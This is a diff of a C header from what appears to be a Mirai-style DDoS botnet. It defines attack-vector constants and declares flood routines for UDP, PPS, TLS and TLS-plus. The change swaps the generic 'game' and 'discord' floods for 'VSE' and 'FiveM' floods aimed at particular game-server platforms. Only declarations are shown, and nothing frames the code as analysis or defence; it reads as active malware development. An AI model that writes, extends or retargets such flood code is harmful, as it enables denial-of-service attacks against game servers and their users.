@@ -4,8 +4,8 @@
 #include "includes.h"
 
 #define ATK_VEC_UDP             0
-#define ATK_VEC_GAME            1
-#define ATK_VEC_DISCORD         2
+#define ATK_VEC_VSE             1
+#define ATK_VEC_FIVEM           2
 #define ATK_VEC_PPS             3
 #define ATK_VEC_TLS             4
 #define ATK_VEC_TLSPLUS         5
@@ -76,8 +76,8 @@ char *attack_get_opt_str(int, struct attack_option *, int, uint8_t);
 int attack_get_opt_int(int, struct attack_option *, int, uint8_t);
 
 void attack_udp_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
-void attack_game_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
-void attack_discord_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
+void attack_vse_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
+void attack_fivem_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_pps_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_tls_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
 void attack_tlsplus_flood(ipv4_t, uint8_t, struct attack_target *, int, struct attack_option *, int);
